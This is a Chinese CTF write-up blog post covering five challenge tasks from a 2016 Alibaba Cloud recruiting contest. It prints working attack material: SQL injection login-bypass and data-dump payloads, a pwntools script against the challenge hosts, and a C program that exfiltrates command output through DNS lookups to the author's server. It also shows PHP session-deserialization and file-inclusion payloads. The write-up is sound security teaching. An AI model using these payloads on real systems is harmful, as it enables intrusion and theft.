@@ -1,0 +1,278 @@
+---
+layout:		post
+title:		ALIYUN DEFENCE CTF
+subtitle:	writeup
+data:		2016-08-22
+author:		"dogewatch"
+header-img:	"img/post/ali-1.png"
+tags:
+    - web
+    - ctf
+---
+
+> let's go
+
+# 前言
+
+一开始看到微博上好些阿里云的在转发一个送手机的微博，看了眼图片直觉告诉我这就是个招人用的ctf题。不过当时也没在意(因为要明年才能出来实习。。>_<)，随手一转就不管了。后来在90大寿那天跟@(__香港记者跑得快__)聊天时发现他也在做阿里的这个题，于是想着反正也没啥事做不如看看先。
+
+总的来说必做题分为4道吧，第一道是个misc，第二道是个web，第三道是个逆向，第四道也是个web题。其实都挺简单的，除了第四道稍微需要些脑洞外。
+
+# no1
+这是一道misc题，原图如下：
+![img](/img/post/ali-2.png)
+大致思路就是补全条码然后取反色。在补全条码的过程中可以只把最上或者最下补全，然后截一条线进行上下拉伸就能得到补全完整的图，取反色后的结果如下：
+![img](/img/post/ali-3.jpeg)
+这时用微信扫是扫不出来的，这里推荐一个<a href="https://online-barcode-reader.inliteresearch.com/">条码扫描网站</a>，上传条码图片得到结果为第二道题的地址 121.42.149.60/1cc88340。
+
+# no2
+这是一道web题，主要考察的是mysql的sql注入。查看网页源码可以得到sql过滤代码：
+
+```
+include('common.php');
+function str_filter($string)
+{
+    $string = str_replace(' ','',$string);
+    $string = str_replace('#','',$string);
+    $string = str_replace('*','',$string);
+    $string = str_replace("'",'',$string);
+    $string = str_replace('"','',$string);
+    $string = str_replace(';','',$string);
+    $string = str_replace('<','<',$string);
+    $string = str_replace('>','>',$string);
+    $string = str_replace("{",'',$string);
+    $string = str_replace('}','',$string);
+    return $string;
+}
+$username = str_filter($_POST['username']);
+$password = str_filter($_POST['password']);
+$sql = sprintf("select username from old_driver_users where username='%s' and password ='%s';", $username, $password);
+$result=mysql_db_query('old_driver', $sql, $conn);
+$row =  mysql_fetch_row($result);
+if (empty($row[0]))
+{
+    exit('username or password wrong!');
+}
+else
+{
+    av();
+}
+```
+(吐槽下阿里的命名，又是老司机又是av的，后面还有题里有mdzz。。)
+从代码里可以看到，sql注入种常用到的引号和空格都被过滤了。对于单引号的过滤可以使用\来转义掉username＝‘’中的第二个单引号，使之变成 ```username='\' and password='```
+不过这样就使得password的第二个单引号落单了，因为不能输入单引号来与之配对，所以可以选择用注释符号来注释掉它。
+mysql里常用的注释符有#和```-- ```(```--```后面必须要有个空格)，题目过滤了#和空格，但是可以利用％09或者％0b来替换空格(％09和％0b是水平／垂直制表符的意思，不过在mysql中会被当作空格处理)
+于是绕过登陆的payload为 ```username=admin\&password=or%0b1=1--%0b```
+得到的结果是 ```Oh~,admin.Where is the flag? ```
+之前扫过这个站，没发现什么别的目录啊服务之类的，所以flag只能在数据库里了。还是mysql注入那一套，去information_schema里弄到表名列名，后来发现根本不用这么麻烦，因为flag就在password字段里。附上最终的payload：
+
+```
+username=admin\&password=%0bunion%0bselect%0bgroup_concat(username,0x2a2a2a2a,password)%0bfrom%0busers%0b--%0b
+```
+结果如图：
+![img](/img/post/ali-4.png)
+
+# no3
+来到第3道题，这是一道逆向题。作为一条web狗一开始让我做逆向我是拒绝的，但是在内心深处我还是渴望进化成bin爷爷(目前正利用业余时间学习0day安全那本书，过段时间会写两篇心得啥的)。
+粗略看了下这是个没加壳的elf文件，扔到ida里直接看反汇编代码。整个代码都挺简单的，作为一个基本不会汇编逆向的web狗都能看得懂。大致流程是程序绑定监听一个端口号，然后将/dev/urandom文件的前4个字节发送至这个端口，接着从这个端口中接受4字节与一个通过特定计算算出的数做比较，如此进行5轮，如果5轮结果都正确的话就会将flag发送到这个端口上。
+计算待比较数的函数也挺简单，甚至不需要看懂，只需要知道参数分别是发送至端口的数和当前轮次就行了。这里需要注意到的是接受到的数据是被翻转过的，所以只取第一个字节就行。
+还有个坑就是之前看反汇编时没注意到每次的端口号不一样，所以死活进行不到第3轮。后来放在本地跑起来得到5次的端口号。
+下面是整个利用代码：
+
+```
+# -*- coding:utf-8 -*-
+
+from pwn import *
+
+
+p = remote("114.215.211.232",1234)
+
+#p = remote("192.168.20.132",1234)
+
+
+def decode(a1,a2):
+	v3 = 0
+	if(a2 == 0):
+		v3 = a1 * (((a2 + 2) >> 1) + 2)
+	if(a2 == 1):
+		v3 = 4 * (a2 + 1) +2 + a1
+	if(a2 == 2):
+		v3 = a1 * (((a2 + 2) >> 1) + 2)
+	if(a2 == 3):
+		v3 = 4 * (a2 + 1) +2 + a1
+	if(a2 == 4):
+		v3 = a1 * (((a2 + 2) >> 1) + 2)
+
+	return v3
+
+def exxp(i):
+	leak = p.recv()
+	print leak
+	leak = leak[0]
+	print leak
+	leak = ord(leak)
+	ans = decode(leak,i)
+
+	print hex(ans)
+
+	ans = p32(ans)
+	print ans
+	p.sendline(ans)
+
+exxp(0)
+
+p = remote("114.215.211.232",2713)
+exxp(1)
+
+p = remote("114.215.211.232",6350)
+exxp(2)
+
+p = remote("114.215.211.232",6175)
+exxp(3)
+
+p = remote("114.215.211.232",8764)
+exxp(4)
+
+
+
+p.interactive()
+```
+
+结果如图，得到第4题的地址
+![img](/img/post/ali-5.png)
+
+# no4
+这题是必做题的最后一道了，也是比较有意思的一道。一上来是个上传页面，试了jpg,png,zip,php,txt等都不能上传，扫端口服务也无果。通过报错页面知道是python flask搭建的web服务，不过也没有什么想法。
+但是在页面源码处发现给明了系统版本号，于是突发奇想编译一个elf上传试试居然通过了。这么一来就猜测这题的思路大致是要上传一个能通过沙箱验证的程序然后读取flag文件或者反弹一个shell回来。
+一开始编写了一个最简单的建立socekt通信的，但是死活收不到连接请求。这个时候就想会不会是程序没加壳之类的，于是试了upx打包之后发现还是不行，这个时候思路就走到死胡同了，不知道怎么才能知道上传的程序到底运行起来了没。卡了一天之后实在没办法就到微博上去勾搭垚神@(__Zz土z土z土zZ__)，告诉说不一定没执行，只是外面收不到消息而已。这才恍然大悟，看来单独建立socket连接是不行的，需要搭某个服务的顺风车才能把消息发出来。
+第一个想到的就是利用dns请求。先写了一个执行```system("nslookup hello.com 我的ip")```的程序，发现果然收到了这个dns请求。
+接下来就顺理成章了，利用popen执行列目录，读文件等系统命令，将结果填到需要请求解析的域名处，大致代码如下：
+
+```
+#include<stdio.h>
+#include<stdlib.h>
+#include<string.h>
+
+int main(){
+FILE *fp;
+if ((fp = popen("ls -a | base64","r")) == NULL){
+system("nslookup failed.hello.com *.*.*.*");
+return -1;
+}
+char buf[64];
+while(fgets(buf,64,fp)!=NULL){
+char buffer[200];
+char command[] = "nslookup %s *.*.*.*";
+sprintf(buffer, command, buf);
+printf("%s", buffer);
+system(buffer);
+}
+return 0;
+}
+```
+得到flag文件所在位置/home/cuckoo/flag.txt，稍微更改下代码，得到flag：http://121.42.149.60/2770f90b44e385afb56c7a806ec5d067/
+![img](/img/post/ali-6.png)
+
+# no5
+
+这是道选做题，据说做了能加分 ＝。＝
+题目给了源码如下：
+
+```
+<?php
+//A webshell is wait for you
+ini_set('session.serialize_handler', 'php');
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this->mdzz = 'phpinfo();';
+    }
+    
+    function __destruct()
+    {
+        eval($this->mdzz);
+    }            
+}
+if(isset($_GET['phpinfo']))
+{
+    $m = new OowoO();
+}
+else
+{
+    highlight_string(file_get_contents('index.php'));
+}
+
+?>
+```
+这题一看就知道是senssion反序列化的问题。由于php为session序列化提供了多种处理格式，常用的有三种，分别是：php, php_binary, php_serialize。如果序列化和反序列化使用的格式不同，就会造成安全问题。
+例如```$_SESSION['a'] = '|O:4:"mdzz":0:{}'```经过php_serialize序列化后会变成```a:1:{s:1:"a";s:16:"|O:4:"mdzz":0:{}";}```，而这时再使用php格式进行反序列化却会得到
+
+```
+array(1) {
+  ["a:1:{s:1:"a";s:20:""]=>
+  object(mdzz)#1 (0) {
+  }
+}
+```
+但是这里还有个问题需要解决的就是怎么去操作session。在php中，如果上传文件，可以通过session获取上传进度，正如http://php.net/manual/zh/session.upload-progress.php所说，如果post一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋到session中。先做一个测试，写一个上传页面
+
+```
+<form action="http://121.42.149.60/68b329da9893e34099c7d8ad5cb9c940/index.php?" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
+    <input type="file" name="file" />
+    <input type="submit" />
+</form>
+```
+上传一个名为```|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:12:\"echo \"hihi\";\"}```的文件，结果如图
+![img](/img/post/ali-7.png)
+可以看到经过反序列化成功地执行了我们的语句。就在我正准备找flag文件的时候，发现system函数被禁用了，同时禁用了一大批能够执行系统命令的函数。没办法，只能先用dirname获取绝对路径，再用scandir来列目录，如图
+![img](/img/post/ali-8.png)
+flag文件就在当前目录下，先用file_get_contents发现读不了，试试show_source成功读到文件，后来发现file_get_contents加上绝对路径就可以读，不知道是什么原理。
+![img](/img/post/ali-9.png)
+
+# no7
+
+简历都发过去了才把这题做出来，不过无所谓了。
+一开始扫端口，扫目录，扫c段都没有收获，卡了很久。后来发现bbscan居然不支持形如http://1.1.1.1/asdfasdf这样的url，它会自动提取出域名/ip，然后往后面添加字典的内容。改了改源码后让它直接在url后面扫描终于扫出了个cvs
+
+```
+/index.php/1.1.1.1/Tue Jul 31 05:25:16 2012//
+D/ColorTestPage////
+```
+访问http://121.42.161.140/dac8dac5f0210825338175d48f0279cb/ColorTestPage/可以看到一个普通的web页面，不是什么cms。
+源码中发现这样的链接 http://121.42.161.140/dac8dac5f0210825338175d48f0279cb/ColorTestPage/index.php?style=cute.tpl，style的值变化可以看到页面的样式发生了改变，于是猜测这里就是加载样式文件的地方。
+既然能加载样式文件是不是就可以读php源码了，用php://filter试了下发现果然可以：
+![img](/img/post/ali-13.png)
+解base64结果如下：
+
+```
+<?php
+/*
+Date: 2015-02-30 15:43:27
+Author: laosiji
+Description: bWFnbmV0Oj94dD11cm46YnRpaDo5NTg3Y2ZlNWU5Y2M2YzQyZmM3YjlhYzNiMmE3YzM0YzBmNDg2MDQx
+*/
+session_save_path('/tmp');
+session_start();
+if(isset($_GET['style']))
+{
+	$_SESSION['look']=$_GET['style'];//browse log
+	require($_GET['style']);
+}else
+{
+	require('normal.tpl');	
+}
+?>
+```
+(菊爷居然在这里放葫芦娃的磁链真是欺骗感情。。)
+看到代码之后就简单了，可以写文件也有任意文件包含，那么就列目录读flag吧(session文件名是sess_ 加上当前的phpsessionid)
+先在style里写php代码，然后再访问style＝/tmp/sess_{你的sessionid}就能看到执行之前代码的结果
+列目录：
+![img](/img/post/ali-11.png)
+读文件：
+![img](/img/post/ali-10.png)
+![img](/img/post/ali-12.png)
+
